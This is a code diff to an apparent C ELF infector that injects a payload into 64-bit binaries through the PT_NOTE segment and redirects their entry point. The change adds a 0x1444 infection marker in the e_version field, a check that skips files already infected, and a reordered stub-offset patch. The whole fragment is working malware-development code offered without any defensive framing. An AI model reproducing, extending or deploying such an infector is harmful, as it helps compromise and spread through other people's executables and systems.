@@ -65,6 +65,11 @@ static int open_and_map_elf(t_infection *inf, const char *file) {
         fprintf(stderr, "File isn't a 64-bit ELF.\n");
         return -1;
     }
+
+    if (ehdr->e_version == 0x1444) {
+        fprintf(stderr, "File already infected.\n");
+        return -1;
+    }
     return 0;
 }
 
@@ -164,7 +169,6 @@ int infect_ptnote(const char *target_filename, unsigned char *payload, size_t pa
         return 1;
     }
 
-
     // 1. Open the ELF file to be injected
     if (open_and_map_elf(inf, target_filename) != 0) {
         free_infection(inf);
@@ -201,6 +205,7 @@ int infect_ptnote(const char *target_filename, unsigned char *payload, size_t pa
 
     // 9. Patch the end of the code with instructions to jump to the original entry point
     patch_jump_instruction(inf, payload, payload_size);
+    patch_stub_offset(inf);
 
     // 10. Add our injected code to the end of the file
     if (write_payload(inf, payload, payload_size) != 0) {
@@ -208,7 +213,8 @@ int infect_ptnote(const char *target_filename, unsigned char *payload, size_t pa
         return 1;
     }
 
-    patch_stub_offset(inf);
+    // 11. Mark the file as infected
+    inf->ehdr->e_version = 0x1444;
 
     printf("Injection successful!\n");
     printf("Original entry: 0x%lx -> New entry: 0x%lx\n",
